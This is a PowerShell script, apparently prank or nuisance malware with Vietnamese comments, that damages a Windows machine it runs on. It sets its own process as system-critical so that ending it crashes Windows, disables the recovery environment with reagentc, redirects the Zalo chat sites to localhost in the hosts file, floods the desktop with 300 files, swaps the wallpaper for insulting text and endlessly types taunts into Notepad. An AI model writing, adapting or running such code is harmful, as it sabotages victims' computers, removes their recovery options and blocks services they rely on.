function Set-ProcessCritical {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if ($isAdmin) {
        $ntdll = Add-Type -MemberDefinition @"
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int RtlAdjustPrivilege(int privilege, bool enablePrivilege, bool isThreadPrivilege, out bool previousValue);
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int RtlSetProcessIsCritical(int isCritical, int reserved, int needScb);
"@ -Name "NTDLL" -Namespace "Win32" -PassThru

        $null = $ntdll::RtlAdjustPrivilege(20, $true, $false, [ref] $false)
        $null = $ntdll::RtlSetProcessIsCritical(1, 0, 0)
        return $true
    }
    else {
        return $false
    }
}

Set-ProcessCritical


reagentc.exe /disable

$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'hai1723fuckyou')
$random = Get-Random -Minimum 1000 -Maximum 9999

$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"

# Đọc nội dung file hosts
$hostsContent = Get-Content -Path $hostsPath

# Kiểm tra và thêm chat.zalo.me nếu chưa có
if ($hostsContent -notmatch "chat.zalo.me") {
    Add-Content -Path $hostsPath -Value "`n127.0.0.1    chat.zalo.me"
}

# Kiểm tra và thêm web.zalo.me nếu chưa có
if ($hostsContent -notmatch "web.zalo.me") {
    Add-Content -Path $hostsPath -Value "`n127.0.0.1    web.zalo.me"
}


for ($i = 1; $i -le 300; $i++) {
    $fileName = "$desktopPath-$i.txt"
    New-Item -Path $fileName -ItemType File -Force
}

# Đặt kích thước hình nền
$width = 1920
$height = 1080

# Tạo một bitmap mới
$bmp = New-Object Drawing.Bitmap $width, $height
$graphics = [Drawing.Graphics]::FromImage($bmp)

# Xóa nền với màu đen
$graphics.Clear([Drawing.Color]::Black)

# Thiết lập font và màu chữ
$font = New-Object Drawing.Font "Arial", 48, [Drawing.FontStyle]::Bold
$brush = New-Object Drawing.SolidBrush [Drawing.Color]::White

# Tạo văn bản
$text = "ben dog"

# Tính toán kích thước văn bản
$textSize = $graphics.MeasureString($text, $font)

# Tính toán vị trí để văn bản được căn giữa
$x = ($width - $textSize.Width) / 2
$y = ($height - $textSize.Height) / 2

# Vẽ văn bản lên ảnh
$graphics.DrawString($text, $font, $brush, $x, $y)

# Lưu ảnh vào thư mục TEMP
$imagePath = "$env:TEMP\black_background_with_text.png"
$bmp.Save($imagePath, [Drawing.Imaging.ImageFormat]::Png)

# Thay đổi hình nền desktop
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 3)

# Giải phóng tài nguyên
$graphics.Dispose()
$bmp.Dispose()

# Mở Notepad
Start-Process notepad
Start-Sleep -Seconds 1

# Lấy cửa sổ của Notepad để gửi phím
$notepad = Get-Process | Where-Object {$_.MainWindowTitle -like "*Untitled - Notepad*"} 

if ($notepad) {
    # Đợi Notepad sẵn sàng
    Start-Sleep -Seconds 1

    # Gõ liên tục chuỗi "hai1723 on top!"
    while ($true) {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.SendKeys]::SendWait("hai1723 on top!{ENTER}avast shit!{ENTER}")
        Start-Sleep -Milliseconds 500
    }
}

